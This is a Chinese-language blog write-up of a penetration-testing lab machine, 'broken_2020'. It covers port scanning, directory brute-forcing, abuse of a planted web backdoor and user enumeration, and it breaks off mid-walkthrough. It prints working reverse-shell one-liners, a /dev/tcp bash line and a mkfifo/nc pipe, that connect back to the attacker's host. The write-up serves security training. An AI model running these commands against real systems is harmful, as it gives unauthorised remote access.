@@ -1,0 +1,752 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="broken_2020 靶机信息收集1234567┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.232     PORT   STATE SERVICE22&#x2F;tcp open  ssh80&#x2F;tcp open  httpMAC Address: 08:00:27:D3:A9:03 (Oracle VirtualBox v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="broken_2020 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/10/18e513304239.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="broken_2020 靶机信息收集1234567┌──(kali㉿kali)-[~]└─$ sudo nmap --min-rate 10000 -p- 192.168.1.232     PORT   STATE SERVICE22&#x2F;tcp open  ssh80&#x2F;tcp open  httpMAC Address: 08:00:27:D3:A9:03 (Oracle VirtualBox v">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/0a80730e6945869c0b7a2e3b25c7a20d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/fc43454d54a4a58cd9e8c8180643d7d8_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ff5c10eb570ec5511e8cfd5e13ae0696_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/ed56c647fde127f642ca8800ddf4b1bb_MD5.png">
+<meta property="article:published_time" content="2023-10-15T13:29:43.000Z">
+<meta property="article:modified_time" content="2023-10-16T11:15:37.952Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/0a80730e6945869c0b7a2e3b25c7a20d_MD5.png">
+  
+  
+  
+  <title>broken_2020 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="broken_2020 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-15 21:29" pubdate>
+          2023年10月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          104 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">broken_2020 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="broken-2020-靶机"><a href="#broken-2020-靶机" class="headerlink" title="broken_2020 靶机"></a>broken_2020 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.1.232     <br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:D3:A9:03 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure>
+
+<p>开放了 22 和 80 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.1.232    <br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 7e:f3:33:8c:be:0c:ed:d7:0e:c6:67:cc:73:bf:c0:ab (RSA)<br>|   256 ee:ed:74:02:0d:3f:7d:6d:45:aa:ff:f3:3a:d0:1a:d9 (ECDSA)<br>|_  256 d1:18:a9:ef:7f:b6:c8:a9:30:52:c8:e6:b6:ec:64:80 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Coming Soon<br>|_http-server-header: Apache/2.4.38 (Debian)<br>MAC Address: 08:00:27:D3:A9:03 (Oracle VirtualBox virtual NIC)<br><br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 5.X<br>OS CPE: cpe:/o:linux:linux_kernel:5<br>OS details: Linux 5.0 - 5.5<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+
+<p>Debian 操作系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.1.232<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.38 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">MAC Address: 08:00:27:D3:A9:03 (Oracle VirtualBox virtual NIC)</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p><code>/images/</code> 目录，先来目录爆破吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo dirsearch -u http://192.168.1.232       <br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>[10:23:58] 301 -  312B  - /cms  -&gt;  http://192.168.1.232/cms/               <br>[10:23:58] 200 -  438B  - /cms/                                             <br>[10:24:02] 301 -  314B  - /fonts  -&gt;  http://192.168.1.232/fonts/           <br>[10:24:04] 200 -    3KB - /images/                                          <br>[10:24:04] 301 -  315B  - /images  -&gt;  http://192.168.1.232/images/<br>[10:24:04] 200 -    1KB - /index.html                                       <br>[10:24:15] 403 -  278B  - /server-status/                                   <br>[10:24:15] 403 -  278B  - /server-status<br></code></pre></td></tr></table></figure>
+
+<p>网页默认界面是提示新的 cms 正在准备中，网页源码中没隐藏信息</p>
+<p><img src="/pic/0a80730e6945869c0b7a2e3b25c7a20d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>cms</code>进入后是个安装界面点击安装跳转到 <code>http://192.168.1.232/cms/?install=off</code></p>
+<p><img src="/pic/fc43454d54a4a58cd9e8c8180643d7d8_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>似乎是第一个 flag，但是安装界面再也回不去了</p>
+<p>原本想试试换个更大的字典爆破，但是可能是爆破频率上去后靶机的响应就会有问题，所以只好暂时放弃</p>
+<p>之后我对图片进行了查看，尝试发掘其中是否有隐写，font.jpg 倒是可能有 steghide 隐写，但是使用 stegseek 爆破不出口令</p>
+<p>这里卡了一会，主要是在判断图片是否有信息隐藏，然后尝试对 cms 目录进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo dirsearch -u 192.168.1.232/cms/ <br><br>[22:40:32] 301 -  315B  - /cms/cc  -&gt;  http://192.168.1.232/cms/cc/         <br>[22:40:38] 200 -   67B  - /cms/index.html<br></code></pre></td></tr></table></figure>
+
+<h2 id="网站后门反弹-shell"><a href="#网站后门反弹-shell" class="headerlink" title="网站后门反弹 shell"></a>网站后门反弹 shell</h2><p>发现了一个隐藏目录 cc，进去查看，好像是别人留的后门</p>
+<p><img src="/pic/ff5c10eb570ec5511e8cfd5e13ae0696_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>先使用 nc 开启监听试试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo nc -lvnp 443                   <br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.232] 41466<br>GET /39b14733d3eb56a24f928abf52e115b4.sh HTTP/1.0<br>Host: 192.168.1.101:443<br>Connection: close<br></code></pre></td></tr></table></figure>
+
+<p>是在请求一个文件 <code>39b14733d3eb56a24f928abf52e115b4.sh</code></p>
+<p>我们先自己创建个包含反弹 shell 的同名文件，再用 python 开启个 web 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.101/443 0&gt;&amp;1&#x27;</span> &gt; 39b14733d3eb56a24f928abf52e115b4.sh<br><br>┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ python -m http.server 8088<br></code></pre></td></tr></table></figure>
+
+<p>提前开启监听然后访问以下链接，从而反弹 shell <code>192.168.1.232/cms/cc/?ip=192.168.1.101&amp;port=8088</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/Broken_2020]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.232] 41480<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (535): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux broken 4.19.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux</span><br>www-data@broken:/var/www/html$ <span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>www-data@broken:/var/www/html$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@broken:/var/www/html$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data:<br></code></pre></td></tr></table></figure>
+
+<h2 id="用户移动"><a href="#用户移动" class="headerlink" title="用户移动"></a>用户移动</h2><p>反弹 shell 成功，看看敏感文件权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/var/www/html$ <span class="hljs-built_in">ls</span> -liah /etc/passwd /etc/shadow   <br><span class="hljs-built_in">ls</span> -liah /etc/passwd /etc/shadow <br>269342 -rw-r--r-- 1 root root   1.6K Mar 24  2020 /etc/passwd<br>269646 -rw-r----- 1 root shadow 1.1K Mar 26  2020 /etc/shadow<br></code></pre></td></tr></table></figure>
+
+<p>查看网站目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 28K<br>7030 drwxr-xr-x 2 www-data www-data 4.0K Oct 16 04:48 .<br> 437 drwxr-xr-x 3 www-data www-data 4.0K Oct 15 16:37 ..<br>6671 -rw-r--r-- 1 www-data www-data   32 Oct 15 16:37 e425ef56a6ca4a3101e775d5019fb237.txt<br>  39 -rw-r--r-- 1 www-data www-data  164 Mar 24  2020 fe8b7cfd24a4ad396054c8cd2f44d296.py<br>7384 -rw-r--r-- 1 www-data www-data  992 Mar 24  2020 index.php<br>8655 -rw-r--r-- 1 www-data www-data   54 Oct 16 04:51 log.txt<br>8654 -rw-r--r-- 1 www-data www-data   82 Oct 16 04:51 shell.sh<br></code></pre></td></tr></table></figure>
+
+<p>我们应该就是通过 shell.sh 后门进来的，看一眼 python 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">cat</span> fe8b7cfd24a4ad396054c8cd2f44d296.py<br><span class="hljs-built_in">cat</span> fe8b7cfd24a4ad396054c8cd2f44d296.py<br>import requests<br>import os<br><br>file = open(<span class="hljs-string">&quot;e425ef56a6ca4a3101e775d5019fb237.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>script=file.read()<br>file.close()<br><br><br>ip=<span class="hljs-string">&quot;test&quot;</span><br>url=<span class="hljs-string">&quot;http://&quot;</span>+ip+<span class="hljs-string">&quot;/&quot;</span>+script+<span class="hljs-string">&quot;.sh&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>python 文件读取 txt 中的文件中的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">cat</span> e425ef56a6ca4a3101e775d5019fb237.txt<br>&lt;ml/cms/cc$ <span class="hljs-built_in">cat</span> e425ef56a6ca4a3101e775d5019fb237.txt<br>39b14733d3eb56a24f928abf52e115b4<br>www-data@broken:/var/www/html/cms/cc$ <span class="hljs-built_in">cat</span> shell.sh<br><span class="hljs-built_in">cat</span> shell.sh<br><span class="hljs-built_in">rm</span> /tmp/f;<span class="hljs-built_in">mkfifo</span> /tmp/f;<span class="hljs-built_in">cat</span> /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.1.101 443 &gt;/tmp/f<br></code></pre></td></tr></table></figure>
+
+<p>txt 文件中保存着请求文件的名字，请求此文件，并将其写入 shell.sh 并运行。逻辑理清楚了，不过对提权没帮助，看看用户家目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/home/alice$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 48K<br>  31 drwxr-xr-x 5 alice alice 4.0K Mar 26  2020 .<br> 193 drwxr-xr-x 3 root  root  4.0K Mar 24  2020 ..<br>6538 lrwxrwxrwx 1 alice alice    9 Mar 24  2020 .bash_history -&gt; /dev/null<br>  67 -rw-r--r-x 1 alice alice  220 Mar 24  2020 .bash_logout<br>7046 -rw-r--r-- 1 alice alice  570 Jan 31  2010 .bashrc<br>6523 drwxr-xr-x 3 alice alice 4.0K Mar 24  2020 .cache<br>6842 drwxr-xr-x 3 alice alice 4.0K Mar 24  2020 .<span class="hljs-built_in">local</span><br>  46 -rw-r--r-- 1 alice alice  148 Aug 17  2015 .profile<br>  54 -rw-r--r-- 1 alice alice   66 Mar 25  2020 .selected_editor<br>6982 -rw-r--r-- 1 alice alice  173 Mar 24  2020 .wget-hsts<br>7131 -rw-r--r-- 1 alice alice   29 Mar 25  2020 flag.txt<br>6841 -rw-r--r-- 1 alice alice  141 Mar 25  2020 note.txt<br>6859 drwxrwxrwx 2 alice alice 4.0K Mar 26  2020 script<br></code></pre></td></tr></table></figure>
+
+<p>先把 flag 和 note 拿了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/home/alice$ <span class="hljs-built_in">cat</span> note.txt<br><span class="hljs-built_in">cat</span> note.txt<br>Alice, <br><br>Please <span class="hljs-keyword">do</span> not install TrustMeCMS, I need check the <span class="hljs-built_in">source</span> before<br><br>PS: I created a script to clear apache <span class="hljs-built_in">log</span> during the tests<br><br>root<br>www-data@broken:/home/alice$ <span class="hljs-built_in">cat</span> flag.txt<br><span class="hljs-built_in">cat</span> flag.txt<br>&#123;FLAG2:**Robing the rober**&#125;<br></code></pre></td></tr></table></figure>
+
+<p>root 写了个定时清除 apach 日志的脚本，还有个 script 目录看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@broken:/home/alice/script$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 16K<br>6859 drwxrwxrwx 2 alice alice 4.0K Mar 26  2020 .<br>  31 drwxr-xr-x 5 alice alice 4.0K Mar 26  2020 ..<br>6862 -rw-r--r-x 1 alice alice   48 Oct 16 04:57 clear.log<br>6861 -rwxr--r-- 1 alice alice  585 Mar 25  2020 log.py<br>www-data@broken:/home/alice/script$ <span class="hljs-built_in">cat</span> log.py<br><span class="hljs-built_in">cat</span> log.py<br><span class="hljs-comment">#!/usr/bin/python2.7</span><br>import requests<br>import os<br>import datetime<br><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">#Juste in case I want stop this script remotly</span><br><span class="hljs-string"></span><br><span class="hljs-string">r = requests.get(&quot;</span>https://pastebin.com/raw/9vzu2CA5<span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">cmd=str(r.text)</span><br><span class="hljs-string">check =&quot;</span>stopit<span class="hljs-string">&quot;</span><br><span class="hljs-string">if check == cmd :</span><br><span class="hljs-string">        os.system(&#x27;cp /home/alice/script/log.py /home/alice/script/log.bak&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br><br><br>path=<span class="hljs-string">&quot;/var/log/apache2&quot;</span><br><span class="hljs-built_in">dir</span> = os.listdir(path)<br><span class="hljs-built_in">date</span> = str(datetime.datetime.now())<br><span class="hljs-keyword">for</span> logfile <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span> :<br>        clear = open(path+<span class="hljs-string">&quot;/&quot;</span>+logfile, <span class="hljs-string">&quot;w&quot;</span>)<br>        clear.truncate(0)<br>        clear.close()<br>logfile = open(<span class="hljs-string">&quot;/home/alice/script/clear.log&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)<br>logfile.write(<span class="hljs-string">&quot;last clear apache log &quot;</span>+<span class="hljs-built_in">date</span>)<br>logfile.close()<br></code></pre></td></tr></table></figure>
+
+<p>清除日志的文件就是 clear.log，不过由于此文件我们没有更改权限，虽然这个目录是 777 权限</p>
+<p>继续信息收集，在根目录下发现了 backup.py 和 back 文件夹</p>
